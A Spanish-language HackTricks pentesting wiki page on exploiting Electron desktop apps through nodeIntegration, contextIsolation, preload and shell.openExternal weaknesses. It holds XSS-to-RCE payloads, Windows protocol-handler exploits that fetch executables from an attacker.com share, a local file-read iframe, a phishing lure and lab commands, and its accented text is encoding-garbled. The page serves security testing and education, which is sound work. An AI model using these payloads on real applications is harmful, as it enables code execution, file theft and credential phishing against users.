# Electron Desktop Apps

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Introducci칩n

Electron combina un backend local (con **NodeJS**) y un frontend (**Chromium**), aunque carece de algunos de los mecanismos de seguridad de los navegadores modernos.

Por lo general, puedes encontrar el c칩digo de la aplicaci칩n electron dentro de una aplicaci칩n `.asar`, para obtener el c칩digo necesitas extraerlo:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
En el c칩digo fuente de una aplicaci칩n Electron, dentro de `packet.json`, puedes encontrar especificado el archivo `main.js` donde se configuran las opciones de seguridad.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron tiene 2 tipos de procesos:

* Proceso Principal (tiene acceso completo a NodeJS)
* Proceso de Renderizado (deber칤a tener acceso restringido a NodeJS por razones de seguridad)

![](<../../../.gitbook/assets/image (182).png>)

Un **proceso de renderizado** ser치 una ventana del navegador cargando un archivo:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
Los ajustes del **proceso de renderizado** se pueden **configurar** en el **proceso principal** dentro del archivo main.js. Algunas de las configuraciones **prevenir치n que la aplicaci칩n Electron obtenga RCE** u otras vulnerabilidades si los **ajustes est치n correctamente configurados**.

La aplicaci칩n electron **podr칤a acceder al dispositivo** a trav칠s de las APIs de Node, aunque se puede configurar para prevenirlo:

* **`nodeIntegration`** - est치 `desactivado` por defecto. Si est치 activado, permite acceder a las caracter칤sticas de Node desde el proceso de renderizado.
* **`contextIsolation`** - est치 `activado` por defecto. Si est치 desactivado, los procesos principal y de renderizado no est치n aislados.
* **`preload`** - vac칤o por defecto.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - est치 desactivado por defecto. Restringir치 las acciones que NodeJS puede realizar.
* Integraci칩n de Node en Trabajadores
* **`nodeIntegrationInSubframes`** - est치 `desactivado` por defecto.
* Si **`nodeIntegration`** est치 **habilitado**, esto permitir칤a el uso de **APIs de Node.js** en p치ginas web que est치n **cargadas en iframes** dentro de una aplicaci칩n Electron.
* Si **`nodeIntegration`** est치 **deshabilitado**, entonces los preloads se cargar치n en el iframe.

Ejemplo de configuraci칩n:
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
Algunos **RCE payloads** de [aqu칤](https://7as.es/electron/nodeIntegration\_rce.txt):
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### Capturar tr치fico

Modifica la configuraci칩n de start-main y a침ade el uso de un proxy como:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Inyecci칩n de C칩digo Local en Electron

Si puedes ejecutar localmente una aplicaci칩n de Electron, es posible que puedas hacer que ejecute c칩digo javascript arbitrario. Consulta c칩mo en:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

Si **nodeIntegration** est치 configurado en **on**, el JavaScript de una p치gina web puede utilizar caracter칤sticas de Node.js f치cilmente solo llamando a `require()`. Por ejemplo, la forma de ejecutar la aplicaci칩n calc en Windows es:
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

El script indicado en esta configuraci칩n se **carga antes que otros scripts en el renderizador**, por lo que tiene **acceso ilimitado a las API de Node**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Por lo tanto, el script puede exportar node-features a p치ginas:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**Si `contextIsolation` est치 activado, esto no funcionar치**
{% endhint %}

## RCE: XSS + contextIsolation

El _**contextIsolation**_ introduce los **contextos separados entre los scripts de la p치gina web y el c칩digo interno de JavaScript de Electron** para que la ejecuci칩n de JavaScript de cada c칩digo no afecte al otro. Esta es una caracter칤stica necesaria para eliminar la posibilidad de RCE.

Si los contextos no est치n aislados, un atacante puede:

1. Ejecutar **JavaScript arbitrario en el renderer** (XSS o navegaci칩n a sitios externos)
2. **Sobrescribir el m칠todo incorporado** que se utiliza en preload o en el c칩digo interno de Electron a una funci칩n propia
3. **Activar** el uso de la **funci칩n sobrescrita**
4. RCE?

Hay 2 lugares donde los m칠todos incorporados pueden ser sobrescritos: En el c칩digo de preload o en el c칩digo interno de Electron:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### Bypass click event

Si hay restricciones aplicadas al hacer clic en un enlace, es posible que puedas eludirlas **haciendo un clic medio** en lugar de un clic izquierdo normal.
```javascript
window.addEventListener('click', (e) => {
```
## RCE a trav칠s de shell.openExternal

Para m치s informaci칩n sobre estos ejemplos, consulta [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) y [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Al implementar una aplicaci칩n de escritorio Electron, asegurar la configuraci칩n correcta de `nodeIntegration` y `contextIsolation` es crucial. Se establece que **la ejecuci칩n remota de c칩digo del lado del cliente (RCE)** que apunta a scripts de precarga o al c칩digo nativo de Electron desde el proceso principal se previene de manera efectiva con estas configuraciones en su lugar.

Cuando un usuario interact칰a con enlaces o abre nuevas ventanas, se activan oyentes de eventos espec칤ficos, que son cruciales para la seguridad y funcionalidad de la aplicaci칩n:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Estos oyentes son **sobrescritos por la aplicaci칩n de escritorio** para implementar su propia **l칩gica de negocio**. La aplicaci칩n eval칰a si un enlace navegado debe abrirse internamente o en un navegador web externo. Esta decisi칩n se toma t칤picamente a trav칠s de una funci칩n, `openInternally`. Si esta funci칩n devuelve `false`, indica que el enlace debe abrirse externamente, utilizando la funci칩n `shell.openExternal`.

**Aqu칤 hay un pseudoc칩digo simplificado:**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (261).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (963).png>)

Las mejores pr치cticas de seguridad de Electron JS desaconsejan aceptar contenido no confiable con la funci칩n `openExternal`, ya que podr칤a llevar a RCE a trav칠s de varios protocolos. Los sistemas operativos admiten diferentes protocolos que podr칤an desencadenar RCE. Para ejemplos detallados y m치s explicaciones sobre este tema, se puede consultar [este recurso](https://positive.security/blog/url-open-rce#windows-10-19042), que incluye ejemplos de protocolos de Windows capaces de explotar esta vulnerabilidad.

**Ejemplos de exploits de protocolos de Windows incluyen:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## Lectura de Archivos Internos: XSS + contextIsolation

**Deshabilitar `contextIsolation` permite el uso de `<webview>` tags**, similar a `<iframe>`, para leer y exfiltrar archivos locales. Un ejemplo proporcionado demuestra c칩mo explotar esta vulnerabilidad para leer el contenido de archivos internos:

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf\_F2ttJg (1).png>)

Adem치s, se comparte otro m칠todo para **leer un archivo interno**, destacando una cr칤tica vulnerabilidad de lectura de archivos locales en una aplicaci칩n de escritorio Electron. Esto implica inyectar un script para explotar la aplicaci칩n y exfiltrar datos:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Chromium Antiguo**

Si el **chromium** utilizado por la aplicaci칩n es **antiguo** y hay **vulnerabilidades** **conocidas** en 칠l, podr칤a ser posible **explotarlo y obtener RCE a trav칠s de un XSS**.\
Puedes ver un ejemplo en este **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **Phishing XSS a trav칠s de bypass de regex de URL interna**

Suponiendo que encontraste un XSS pero **no puedes activar RCE o robar archivos internos**, podr칤as intentar usarlo para **robar credenciales a trav칠s de phishing**.

Primero que nada, necesitas saber qu칠 sucede cuando intentas abrir una nueva URL, revisando el c칩digo JS en el front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
La llamada a **`openInternally`** decidir치 si el **enlace** se **abrir치** en la **ventana de escritorio** ya que es un enlace que pertenece a la plataforma, **o** si se abrir치 en el **navegador como un recurso de terceros**.

En el caso de que la **regex** utilizada por la funci칩n sea **vulnerable a bypasses** (por ejemplo, **no escapando los puntos de los subdominios**), un atacante podr칤a abusar del XSS para **abrir una nueva ventana que** estar치 ubicada en la infraestructura del atacante **pidiendo credenciales** al usuario:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **Herramientas**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) es una herramienta para identificar configuraciones incorrectas y anti-patrones de seguridad en aplicaciones basadas en Electron.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) es un plugin de c칩digo abierto para VS Code para aplicaciones Electron que utiliza Electronegativity.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) para verificar bibliotecas de terceros vulnerables.
* [**Electro.ng**](https://electro.ng/): Necesitas comprarlo.

## Laboratorios

En [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) puedes encontrar un laboratorio para explotar aplicaciones Electron vulnerables.

Algunos comandos que te ayudar치n con el laboratorio:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **Referencias**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* M치s investigaciones y art칤culos sobre la seguridad de Electron en [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
